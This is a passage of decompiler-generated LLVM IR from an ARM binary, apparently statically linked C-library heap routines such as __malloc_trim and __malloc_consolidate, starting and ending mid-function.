  %v0_132d8 = load i32, i32* @r5, align 4
  %v1_132d8 = add i32 %v0_132d8, 16
  %v2_132d8 = inttoptr i32 %v1_132d8 to i32*
  %v3_132d8 = load i32, i32* %v2_132d8, align 4
  store i32 %v3_132d8, i32* %r3.global-to-local, align 4
  %v0_132dc = load i32, i32* @ip, align 4
  %v1_132e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_132e0 = add i32 %v1_132e0, 16
  %v3_132e0 = inttoptr i32 %v2_132e0 to i32*
  store i32 %v3_132d8, i32* %v3_132e0, align 4
  %tmp40 = icmp ult i32 %v0_132dc, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_132e8

dec_label_pc_132e8:                               ; preds = %dec_label_pc_132d0
  %v0_132e8 = load i32, i32* @r5, align 4
  %v1_132e8 = add i32 %v0_132e8, 20
  %v2_132e8 = inttoptr i32 %v1_132e8 to i32*
  %v3_132e8 = load i32, i32* %v2_132e8, align 4
  store i32 %v3_132e8, i32* %r3.global-to-local, align 4
  %v1_132ec = load i32, i32* %r1.global-to-local, align 4
  %v2_132ec = add i32 %v1_132ec, 20
  %v3_132ec = inttoptr i32 %v2_132ec to i32*
  store i32 %v3_132e8, i32* %v3_132ec, align 4
  %v0_132f0 = load i32, i32* @r5, align 4
  %v1_132f0 = add i32 %v0_132f0, 24
  %v2_132f0 = inttoptr i32 %v1_132f0 to i32*
  %v3_132f0 = load i32, i32* %v2_132f0, align 4
  store i32 %v3_132f0, i32* %r3.global-to-local, align 4
  %v1_132f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_132f4 = add i32 %v1_132f4, 24
  %v3_132f4 = inttoptr i32 %v2_132f4 to i32*
  store i32 %v3_132f0, i32* %v3_132f4, align 4
  %v0_132f8 = load i32, i32* @ip, align 4
  %v7_132f8 = icmp eq i32 %v0_132f8, 9
  br i1 %v7_132f8, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_132e8
  %v1_132fc = load i32, i32* @r5, align 4
  %v2_132fc = add i32 %v1_132fc, 28
  %v3_132fc = inttoptr i32 %v2_132fc to i32*
  %v4_132fc = load i32, i32* %v3_132fc, align 4
  store i32 %v4_132fc, i32* %r3.global-to-local, align 4
  %v2_13300 = load i32, i32* %r1.global-to-local, align 4
  %v3_13300 = add i32 %v2_13300, 28
  %v4_13300 = inttoptr i32 %v3_13300 to i32*
  store i32 %v4_132fc, i32* %v4_13300, align 4
  %v1_13304 = load i32, i32* @r5, align 4
  %v2_13304 = add i32 %v1_13304, 32
  %v3_13304 = inttoptr i32 %v2_13304 to i32*
  %v4_13304 = load i32, i32* %v3_13304, align 4
  store i32 %v4_13304, i32* %r3.global-to-local, align 4
  %v2_13308 = load i32, i32* %r1.global-to-local, align 4
  %v3_13308 = add i32 %v2_13308, 32
  %v4_13308 = inttoptr i32 %v3_13308 to i32*
  store i32 %v4_13304, i32* %v4_13308, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_132e8, %dec_label_pc_132d0, %dec_label_pc_132b0, %dec_label_pc_132a4, %bb32
  %v0_1330c = load i32, i32* @r5, align 4
  store i32 %v0_1330c, i32* @r0, align 4
  %v0_13310 = call i32 @free()
  store i32 %v0_13310, i32* %r0.global-to-local, align 4
  %v0_13314 = load i32, i32* @r7, align 4
  %v1_13314 = add i32 %v0_13314, 8
  store i32 %v1_13314, i32* @r4, align 4
  br label %dec_label_pc_13450

dec_label_pc_1331c:                               ; preds = %bb30, %.thread2, %dec_label_pc_1325c
  %v0_13330 = phi i32 [ %v3_1328c, %.thread2 ], [ %v1_131a4, %bb30 ], [ %v1_1331c.pre, %dec_label_pc_1325c ]
  %v0_1331c = load i32, i32* @sb, align 4
  %v2_1331c = sub i32 %v0_13330, %v0_1331c
  store i32 %v2_1331c, i32* %r1.global-to-local, align 4
  %v0_13324 = load i32, i32* @sl, align 4
  %v1_13324 = add i32 %v0_13324, 4
  %v2_13324 = inttoptr i32 %v1_13324 to i32*
  %v3_13324 = load i32, i32* %v2_13324, align 4
  %tmp41 = icmp ugt i32 %v2_1331c, 15
  %v1_1334c = urem i32 %v3_13324, 2
  store i32 %v1_1334c, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1334c, label %dec_label_pc_1332c

dec_label_pc_1332c:                               ; preds = %dec_label_pc_1331c
  %v2_13330 = or i32 %v1_1334c, %v0_13330
  store i32 %v2_13330, i32* %r3.global-to-local, align 4
  store i32 %v2_13330, i32* %v2_13324, align 4
  %v0_13338 = load i32, i32* @sl, align 4
  %v1_13338 = load i32, i32* %r0.global-to-local, align 4
  %v2_13338 = add i32 %v1_13338, %v0_13338
  store i32 %v2_13338, i32* %r2.global-to-local, align 4
  %v1_1333c = add i32 %v2_13338, 4
  %v2_1333c = inttoptr i32 %v1_1333c to i32*
  %v3_1333c = load i32, i32* %v2_1333c, align 4
  %v1_13340 = or i32 %v3_1333c, 1
  store i32 %v1_13340, i32* %r3.global-to-local, align 4
  store i32 %v1_13340, i32* %v2_1333c, align 4
  br label %dec_label_pc_1337c

dec_label_pc_1334c:                               ; preds = %dec_label_pc_1331c
  %v2_13350 = add i32 %v0_13324, %v0_1331c
  store i32 %v2_13350, i32* %r0.global-to-local, align 4
  %v2_13354 = or i32 %v1_1334c, %v0_1331c
  store i32 %v2_13354, i32* %r3.global-to-local, align 4
  %v1_13358 = or i32 %v2_1331c, 1
  store i32 %v1_13358, i32* %r2.global-to-local, align 4
  store i32 %v2_13354, i32* %v2_13324, align 4
  %v0_13360 = load i32, i32* %r2.global-to-local, align 4
  %v1_13360 = load i32, i32* %r0.global-to-local, align 4
  %v2_13360 = add i32 %v1_13360, 4
  %v3_13360 = inttoptr i32 %v2_13360 to i32*
  store i32 %v0_13360, i32* %v3_13360, align 4
  %v0_13364 = load i32, i32* %r0.global-to-local, align 4
  %v1_13364 = load i32, i32* %r1.global-to-local, align 4
  %v2_13364 = add i32 %v1_13364, %v0_13364
  store i32 %v2_13364, i32* %r2.global-to-local, align 4
  %v1_13368 = add i32 %v2_13364, 4
  %v2_13368 = inttoptr i32 %v1_13368 to i32*
  %v3_13368 = load i32, i32* %v2_13368, align 4
  %v1_1336c = or i32 %v3_13368, 1
  store i32 %v1_1336c, i32* %r3.global-to-local, align 4
  store i32 %v1_1336c, i32* %v2_13368, align 4
  %v0_13374 = load i32, i32* %r0.global-to-local, align 4
  %v1_13374 = add i32 %v0_13374, 8
  store i32 %v1_13374, i32* @r0, align 4
  %v0_13378 = call i32 @free()
  store i32 %v0_13378, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1337c

dec_label_pc_1337c:                               ; preds = %dec_label_pc_1332c, %dec_label_pc_1334c
  %v0_1337c = load i32, i32* @sl, align 4
  %v1_1337c = add i32 %v0_1337c, 8
  store i32 %v1_1337c, i32* @r4, align 4
  br label %dec_label_pc_13450

dec_label_pc_13384:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r1.global-to-local, align 4
  %v4_1338c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_1338c, i32* @r8, align 4
  %v2_13390 = inttoptr i32 %v1_131a0 to i32*
  %v3_13390 = load i32, i32* %v2_13390, align 4
  store i32 %v3_13390, i32* @r4, align 4
  %v1_13394 = add i32 %v4_1338c, 860
  %v2_13394 = inttoptr i32 %v1_13394 to i32*
  %v3_13394 = load i32, i32* %v2_13394, align 4
  %v1_13398 = add i32 %v3_13390, 4
  %v1_1339c = add i32 %v3_13394, -1
  store i32 %v1_1339c, i32* %r2.global-to-local, align 4
  %v2_133a0 = add i32 %v1_13398, %v1_1339c
  %v1_133a4 = load i32, i32* @sb, align 4
  %v2_133a4 = add i32 %v2_133a0, %v1_133a4
  store i32 %v2_133a4, i32* %r3.global-to-local, align 4
  %v2_133a8 = sub i32 0, %v3_13394
  %v3_133a8 = and i32 %v2_133a4, %v2_133a8
  store i32 %v3_133a8, i32* @r7, align 4
  %v2_133ac = sub i32 %v3_133a8, %v3_13390
  store i32 %v2_133ac, i32* @fp, align 4
  %v9_133b0 = icmp eq i32 %v1_131a4, %v2_133ac
  br i1 %v9_133b0, label %dec_label_pc_13424, label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %dec_label_pc_13384
  %v2_133b8 = sub i32 %v1_131a0, %v3_13390
  store i32 %v2_133b8, i32* %r0.global-to-local, align 4
  %v2_133bc = add i32 %v3_13390, %v1_131a4
  store i32 %v2_133bc, i32* %r1.global-to-local, align 4
  store i32 %v3_133a8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_133c8 = call i32 @mremap(i32 %v2_133b8, i32 %v2_133bc, i32 %v3_133a8, i32 1)
  store i32 %v4_133c8, i32* %r0.global-to-local, align 4
  %v7_133cc = icmp eq i32 %v4_133c8, -1
  br i1 %v7_133cc, label %dec_label_pc_13418, label %dec_label_pc_133d4

dec_label_pc_133d4:                               ; preds = %dec_label_pc_133b8
  %v1_133d4 = load i32, i32* @r4, align 4
  %v2_133d4 = add i32 %v1_133d4, %v4_133c8
  store i32 %v2_133d4, i32* %r0.global-to-local, align 4
  %v0_133d8 = load i32, i32* @fp, align 4
  %v1_133d8 = or i32 %v0_133d8, 2
  store i32 %v1_133d8, i32* %r3.global-to-local, align 4
  %v2_133dc = add i32 %v2_133d4, 4
  %v3_133dc = inttoptr i32 %v2_133dc to i32*
  store i32 %v1_133d8, i32* %v3_133dc, align 4
  %v0_133e0 = load i32, i32* @r8, align 4
  %v1_133e0 = add i32 %v0_133e0, 868
  %v2_133e0 = inttoptr i32 %v1_133e0 to i32*
  %v3_133e0 = load i32, i32* %v2_133e0, align 4
  store i32 %v3_133e0, i32* %r3.global-to-local, align 4
  %v1_133e4 = add i32 %v0_133e0, 880
  %v2_133e4 = inttoptr i32 %v1_133e4 to i32*
  %v3_133e4 = load i32, i32* %v2_133e4, align 4
  store i32 %v3_133e4, i32* %r2.global-to-local, align 4
  %v0_133e8 = load i32, i32* @r6, align 4
  %v2_133e8 = sub i32 %v3_133e0, %v0_133e8
  store i32 %v2_133e8, i32* %r3.global-to-local, align 4
  %v1_133ec = load i32, i32* @r7, align 4
  %v2_133ec = add i32 %v1_133ec, %v2_133e8
  store i32 %v2_133ec, i32* %r1.global-to-local, align 4
  %v1_133f0 = add i32 %v0_133e0, 872
  %v2_133f0 = inttoptr i32 %v1_133f0 to i32*
  %v3_133f0 = load i32, i32* %v2_133f0, align 4
  store i32 %v3_133f0, i32* %r3.global-to-local, align 4
  %v1_133f8 = add i32 %v0_133e0, 884
  %v2_133f8 = inttoptr i32 %v1_133f8 to i32*
  %v3_133f8 = load i32, i32* %v2_133f8, align 4
  store i32 %v3_133f8, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_133ec, %v3_133e4
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_133d4
  store i32 %v2_133ec, i32* %v2_133e4, align 4
  %v0_13400.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13400.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_133d4, %bb33
  %v1_13400 = phi i32 [ %v0_133e0, %dec_label_pc_133d4 ], [ %v1_13400.pre, %bb33 ]
  %v0_13400 = phi i32 [ %v2_133ec, %dec_label_pc_133d4 ], [ %v0_13400.pre, %bb33 ]
  %v2_13400 = add i32 %v1_13400, 868
  %v3_13400 = inttoptr i32 %v2_13400 to i32*
  store i32 %v0_13400, i32* %v3_13400, align 4
  %v0_13404 = load i32, i32* %r1.global-to-local, align 4
  %v1_13404 = load i32, i32* %r3.global-to-local, align 4
  %v2_13404 = add i32 %v1_13404, %v0_13404
  store i32 %v2_13404, i32* %r1.global-to-local, align 4
  %v1_13408 = load i32, i32* %r2.global-to-local, align 4
  %v0_1340c = load i32, i32* %r0.global-to-local, align 4
  %v1_1340c = add i32 %v0_1340c, 8
  store i32 %v1_1340c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_13404, %v1_13408
  br i1 %tmp43, label %bb35, label %dec_label_pc_13450

bb35:                                             ; preds = %bb34
  %v5_13410 = load i32, i32* @r8, align 4
  %v6_13410 = add i32 %v5_13410, 884
  %v7_13410 = inttoptr i32 %v6_13410 to i32*
  store i32 %v2_13404, i32* %v7_13410, align 4
  br label %dec_label_pc_13450

dec_label_pc_13418:                               ; preds = %dec_label_pc_133b8
  %v0_13418 = load i32, i32* @sb, align 4
  %v1_13418 = add i32 %v0_13418, 4
  store i32 %v1_13418, i32* %r3.global-to-local, align 4
  %v0_1341c = load i32, i32* @r6, align 4
  %v3_1341c = icmp ult i32 %v0_1341c, %v1_13418
  br i1 %v3_1341c, label %dec_label_pc_1342c, label %dec_label_pc_13418.dec_label_pc_13424_crit_edge

dec_label_pc_13418.dec_label_pc_13424_crit_edge:  ; preds = %dec_label_pc_13418
  %v0_13424.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %dec_label_pc_13418.dec_label_pc_13424_crit_edge, %dec_label_pc_13384
  %v0_13424 = phi i32 [ %v0_13424.pre, %dec_label_pc_13418.dec_label_pc_13424_crit_edge ], [ %v0_1318c, %dec_label_pc_13384 ]
  store i32 %v0_13424, i32* @r4, align 4
  br label %dec_label_pc_13450

dec_label_pc_1342c:                               ; preds = %dec_label_pc_13418
  %v1_1342c = add i32 %v0_13418, -7
  store i32 %v1_1342c, i32* %r0.global-to-local, align 4
  %v1_13430 = call i32 @malloc(i32 %v1_1342c)
  store i32 %v1_13430, i32* @r0, align 4
  store i32 %v1_13430, i32* @r4, align 4
  %v2_13434 = icmp eq i32 %v1_13430, 0
  br i1 %v2_13434, label %dec_label_pc_13450, label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %dec_label_pc_1342c
  %v0_1343c = load i32, i32* @r6, align 4
  %v1_1343c = add i32 %v0_1343c, -8
  store i32 %v1_1343c, i32* @r2, align 4
  %v0_13440 = load i32, i32* @r5, align 4
  store i32 %v0_13440, i32* @r1, align 4
  %v0_13444 = call i32 @memcpy()
  %v0_13448 = load i32, i32* @r5, align 4
  store i32 %v0_13448, i32* @r0, align 4
  %v0_1344c = call i32 @free()
  store i32 %v0_1344c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13450

dec_label_pc_13450:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1342c, %dec_label_pc_13424, %dec_label_pc_1337c, %.thread6, %dec_label_pc_131ec, %dec_label_pc_1343c
  store i32 %v2_13140, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v4_13460 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 24) to i32*), align 4
  store i32 %v4_13460, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_13460)
  br label %dec_label_pc_1346c

dec_label_pc_1346c:                               ; preds = %dec_label_pc_13174, %dec_label_pc_1311c, %dec_label_pc_13104, %dec_label_pc_13450
  %v0_1346c = load i32, i32* @r4, align 4
  store i32 %v0_1346c, i32* %r0.global-to-local, align 4
  store i32 %v3_130e4, i32* @r4, align 4
  store i32 %v6_130e4, i32* @r5, align 4
  store i32 %v9_130e4, i32* @r6, align 4
  store i32 %v12_130e4, i32* @r7, align 4
  store i32 %v15_130e4, i32* @r8, align 4
  store i32 %v18_130e4, i32* @sb, align 4
  store i32 %v21_130e4, i32* @sl, align 4
  store i32 %v24_130e4, i32* @fp, align 4
  store i32 %v27_130e4, i32* @lr, align 4
  ret i32 %v0_1346c

; uselistorder directives
  uselistorder i32 %v2_13404, { 1, 0, 2 }
  uselistorder i32 %v2_133ec, { 1, 2, 0, 3 }
  uselistorder i32 %v4_133c8, { 1, 0, 2 }
  uselistorder i32 %v3_133a8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1334c, { 2, 1, 0 }
  uselistorder i32 %v2_1331c, { 1, 0, 2 }
  uselistorder i32 %v0_132b0, { 1, 0 }
  uselistorder i32 %v1_1326c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_131d0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_131c8, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_131ac, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_131a4, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_131a0, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_13190, { 1, 0 }
  uselistorder i32 %v0_1318c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1316c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1346c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13450, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1337c, { 1, 0 }
  uselistorder label %dec_label_pc_1331c, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13268, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1325c, { 1, 0 }
  uselistorder label %dec_label_pc_13258, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_13480(i32 %arg1) local_unnamed_addr {
dec_label_pc_13480:
  %v0_13480 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13480, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13480
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13480, %bb
  %v10_13494 = phi i32 [ %arg1, %dec_label_pc_13480 ], [ 0, %bb ]
  ret i32 %v10_13494

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_13498 = add i32 %arg2, 44
  %v2_13498 = inttoptr i32 %v1_13498 to i32*
  %v3_13498 = load i32, i32* %v2_13498, align 4
  %v12_1349c = load i32, i32* @r7, align 4
  %v1_134a0 = add i32 %v3_13498, 4
  %v2_134a0 = inttoptr i32 %v1_134a0 to i32*
  %v3_134a0 = load i32, i32* %v2_134a0, align 4
  %v1_134a4 = add i32 %arg2, 860
  %v2_134a4 = inttoptr i32 %v1_134a4 to i32*
  %v3_134a4 = load i32, i32* %v2_134a4, align 4
  store i32 %v3_134a4, i32* @r4, align 4
  %v1_134a8 = and i32 %v3_134a0, -4
  store i32 %v1_134a8, i32* @r6, align 4
  %v1_134ac = add i32 %v1_134a8, -17
  %v2_134b0 = add i32 %v1_134ac, %v3_134a4
  store i32 %arg2, i32* @r5, align 4
  %v2_134bc = sub i32 %v2_134b0, %arg1
  store i32 %v3_134a4, i32* %r1.global-to-local, align 4
  %v2_134c4 = udiv i32 %v2_134bc, %v3_134a4
  %v1_134c8 = add i32 %v2_134c4, -1
  store i32 %v1_134c8, i32* %r0.global-to-local, align 4
  %v2_134cc = mul i32 %v1_134c8, %v3_134a4
  store i32 %v2_134cc, i32* @r7, align 4
  %v2_134d0 = icmp eq i32 %v2_134cc, 0
  store i1 %v2_134d0, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_134cc, 1
  br i1 %tmp8, label %dec_label_pc_13538, label %dec_label_pc_134d8

dec_label_pc_134d8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_134dc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_134dc, i32* %r0.global-to-local, align 4
  %v0_134e0 = load i32, i32* @r5, align 4
  %v1_134e0 = add i32 %v0_134e0, 44
  %v2_134e0 = inttoptr i32 %v1_134e0 to i32*
  %v3_134e0 = load i32, i32* %v2_134e0, align 4
  %v0_134e4 = load i32, i32* @r6, align 4
  %v2_134e4 = add i32 %v0_134e4, %v3_134e0
  %v9_134e8 = icmp eq i32 %v1_134dc, %v2_134e4
  store i1 %v9_134e8, i1* @cpsr_z, align 1
  store i32 %v1_134dc, i32* @r4, align 4
  br i1 %v9_134e8, label %dec_label_pc_134f4, label %dec_label_pc_13538

dec_label_pc_134f4:                               ; preds = %dec_label_pc_134d8
  %v0_134f4 = load i32, i32* @r7, align 4
  %v1_134f4 = sub i32 0, %v0_134f4
  store i32 %v1_134f4, i32* %r0.global-to-local, align 4
  %v1_134f8 = call i32 @__GI_sbrk(i32 %v1_134f4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13500 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13500, i32* %r0.global-to-local, align 4
  %v7_13504 = icmp eq i32 %v1_13500, -1
  store i1 %v7_13504, i1* @cpsr_z, align 1
  br i1 %v7_13504, label %dec_label_pc_13538, label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134f4
  %v0_1350c = load i32, i32* @r4, align 4
  %v2_1350c = sub i32 %v0_1350c, %v1_13500
  store i32 %v2_1350c, i32* %r0.global-to-local, align 4
  %v9_1350c = icmp eq i32 %v0_1350c, %v1_13500
  store i1 %v9_1350c, i1* @cpsr_z, align 1
  br i1 %v9_1350c, label %dec_label_pc_13538, label %dec_label_pc_13514

dec_label_pc_13514:                               ; preds = %dec_label_pc_1350c
  %v0_13514 = load i32, i32* @r5, align 4
  %v1_13514 = add i32 %v0_13514, 872
  %v2_13514 = inttoptr i32 %v1_13514 to i32*
  %v3_13514 = load i32, i32* %v2_13514, align 4
  %v1_13518 = load i32, i32* @r6, align 4
  %v2_13518 = sub i32 %v1_13518, %v2_1350c
  store i32 %v2_13518, i32* %r2.global-to-local, align 4
  %v1_1351c = add i32 %v0_13514, 44
  %v2_1351c = inttoptr i32 %v1_1351c to i32*
  %v3_1351c = load i32, i32* %v2_1351c, align 4
  store i32 %v3_1351c, i32* %r1.global-to-local, align 4
  %v2_13520 = sub i32 %v3_13514, %v2_1350c
  %v1_13524 = or i32 %v2_13518, 1
  store i32 %v1_13524, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_13520, i32* %v2_13514, align 4
  %v0_13530 = load i32, i32* %r2.global-to-local, align 4
  %v1_13530 = load i32, i32* %r1.global-to-local, align 4
  %v2_13530 = add i32 %v1_13530, 4
  %v3_13530 = inttoptr i32 %v2_13530 to i32*
  store i32 %v0_13530, i32* %v3_13530, align 4
  %v1_13544.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_13538:                               ; preds = %dec_label_pc_134d8, %dec_label_pc_1350c, %dec_label_pc_134f4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13514, %dec_label_pc_13538
  %v1_13544 = phi i32 [ %v1_13544.pre, %dec_label_pc_13514 ], [ 0, %dec_label_pc_13538 ]
  store i32 %v12_1349c, i32* @r7, align 4
  ret i32 %v1_13544

; uselistorder directives
  uselistorder i1 %v7_13504, { 1, 0 }
  uselistorder i32 %v1_13500, { 2, 1, 0, 3 }
  uselistorder i32 %v3_134a4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %dec_label_pc_13538, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13548 = load i32, i32* @r4, align 4
  store i32 %v3_13548, i32* %stack_var_-36, align 4
  %v0_1354c = load i32, i32* @r0, align 4
  %v1_1354c = inttoptr i32 %v0_1354c to i32*
  %v2_1354c = load i32, i32* %v1_1354c, align 4
  store i32 %v2_1354c, i32* %r3.global-to-local, align 4
  %v2_13550 = icmp eq i32 %v2_1354c, 0
  store i32 %v0_1354c, i32* @r4, align 4
  br i1 %v2_13550, label %dec_label_pc_13688.preheader, label %dec_label_pc_13564

dec_label_pc_13688.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1369025 = add i32 %v0_1354c, 52
  store i32 %v1_1369025, i32* %r3.global-to-local, align 4
  %v2_1369826 = add i32 %v0_1354c, 60
  %v3_1369827 = inttoptr i32 %v2_1369826 to i32*
  store i32 %v1_1369025, i32* %v3_1369827, align 4
  %v0_1369c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1369c29 = add i32 %v0_1369c28, 12
  %v3_1369c30 = inttoptr i32 %v2_1369c29 to i32*
  store i32 %v0_1369c28, i32* %v3_1369c30, align 4
  br label %dec_label_pc_13688.dec_label_pc_13688_crit_edge

dec_label_pc_13564:                               ; preds = %entry
  %v1_13564 = and i32 %v2_1354c, -3
  %v3_13568 = udiv i32 %v2_1354c, 8
  store i32 %v3_13568, i32* %r2.global-to-local, align 4
  store i32 %v1_13564, i32* %v1_1354c, align 4
  %v0_13570 = load i32, i32* @r0, align 4
  %v1_13570 = add i32 %v0_13570, -4
  store i32 %v1_13570, i32* %r3.global-to-local, align 4
  %v1_13574 = load i32, i32* %r2.global-to-local, align 4
  %v4_13574 = mul i32 %v1_13574, 4
  %v5_13574 = add i32 %v4_13574, %v1_13570
  store i32 %v5_13574, i32* %sb.global-to-local, align 4
  %v1_13578 = add i32 %v0_13570, 52
  store i32 %v1_13578, i32* %r7.global-to-local, align 4
  %v1_1357c = add i32 %v0_13570, 4
  store i32 %v1_1357c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13584

dec_label_pc_13584:                               ; preds = %dec_label_pc_13680, %dec_label_pc_13564
  %v1_1367810 = phi i32 [ %v1_13678, %dec_label_pc_13680 ], [ %v5_13574, %dec_label_pc_13564 ]
  %v1_13590 = phi i32 [ %v1_13680, %dec_label_pc_13680 ], [ %v1_1357c, %dec_label_pc_13564 ]
  %v1_13584 = inttoptr i32 %v1_13590 to i32*
  %v2_13584 = load i32, i32* %v1_13584, align 4
  store i32 %v2_13584, i32* %r1.global-to-local, align 4
  %v2_13588 = icmp eq i32 %v2_13584, 0
  br i1 %v2_13588, label %dec_label_pc_13678, label %dec_label_pc_13590

dec_label_pc_13590:                               ; preds = %dec_label_pc_13584
  %v0_13590 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13590, i32* %v1_13584, align 4
  %v0_13594.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %dec_label_pc_1366c, %dec_label_pc_13590
  %v0_135b0 = phi i32 [ %v0_1366c, %dec_label_pc_1366c ], [ %v0_13594.pre, %dec_label_pc_13590 ]
  %v1_13594 = add i32 %v0_135b0, 4
  %v2_13594 = inttoptr i32 %v1_13594 to i32*
  %v3_13594 = load i32, i32* %v2_13594, align 4
  store i32 %v3_13594, i32* %r3.global-to-local, align 4
  %v1_13598 = and i32 %v3_13594, -2
  store i32 %v1_13598, i32* %lr.global-to-local, align 4
  %v2_1359c = add i32 %v1_13598, %v0_135b0
  store i32 %v2_1359c, i32* @r0, align 4
  %v1_135a0 = urem i32 %v3_13594, 2
  %v2_135a0 = icmp eq i32 %v1_135a0, 0
  %v1_135a4 = add i32 %v0_135b0, 8
  %v2_135a4 = inttoptr i32 %v1_135a4 to i32*
  %v3_135a4 = load i32, i32* %v2_135a4, align 4
  store i32 %v3_135a4, i32* %sl.global-to-local, align 4
  %v1_135a8 = add i32 %v2_1359c, 4
  %v2_135a8 = inttoptr i32 %v1_135a8 to i32*
